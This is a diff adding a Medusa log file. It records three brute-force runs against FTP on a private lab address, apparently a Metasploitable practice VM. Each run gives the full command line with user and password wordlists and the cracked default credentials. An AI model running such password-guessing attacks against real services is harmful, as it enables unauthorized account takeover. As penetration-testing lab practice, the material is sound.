@@ -1,0 +1,18 @@
+# Medusa v.2.3 (2025-10-04 19:20:16)
+# medusa -h 192.168.122.128 -U wordlists/ftp_users.txt -P wordlists/ftp_passwords.txt -M ftp -t 2 -O logs/ftp_attack.log 
+2025-10-04 19:20:16 ACCOUNT FOUND: [ftp] Host: 192.168.122.128 User: msfadmin Password: msfadmin [SUCCESS]
+2025-10-04 19:20:34 ACCOUNT FOUND: [ftp] Host: 192.168.122.128 User: ftp Password: msfadmin [SUCCESS]
+2025-10-04 19:20:34 ACCOUNT FOUND: [ftp] Host: 192.168.122.128 User: anonymous Password: msfadmin [SUCCESS]
+# Medusa has finished (2025-10-04 19:20:56).
+# Medusa v.2.3 (2025-10-05 12:07:17)
+# medusa -h 192.168.122.128 -U wordlists/ftp_users.txt -P wordlists/ftp_passwords.txt -M ftp -t 2 -O logs/ftp_attack.log 
+2025-10-05 12:07:17 ACCOUNT FOUND: [ftp] Host: 192.168.122.128 User: msfadmin Password: msfadmin [SUCCESS]
+2025-10-05 12:07:35 ACCOUNT FOUND: [ftp] Host: 192.168.122.128 User: ftp Password: msfadmin [SUCCESS]
+2025-10-05 12:07:35 ACCOUNT FOUND: [ftp] Host: 192.168.122.128 User: anonymous Password: msfadmin [SUCCESS]
+# Medusa has finished (2025-10-05 12:07:57).
+# Medusa v.2.3 (2025-10-05 20:11:15)
+# medusa -h 192.168.122.128 -U wordlists/ftp_users.txt -P wordlists/ftp_passwords.txt -M ftp -t 2 -O logs/ftp_attack.log 
+2025-10-05 20:11:15 ACCOUNT FOUND: [ftp] Host: 192.168.122.128 User: msfadmin Password: msfadmin [SUCCESS]
+2025-10-05 20:11:34 ACCOUNT FOUND: [ftp] Host: 192.168.122.128 User: ftp Password: msfadmin [SUCCESS]
+2025-10-05 20:11:34 ACCOUNT FOUND: [ftp] Host: 192.168.122.128 User: anonymous Password: msfadmin [SUCCESS]
+# Medusa has finished (2025-10-05 20:11:56).
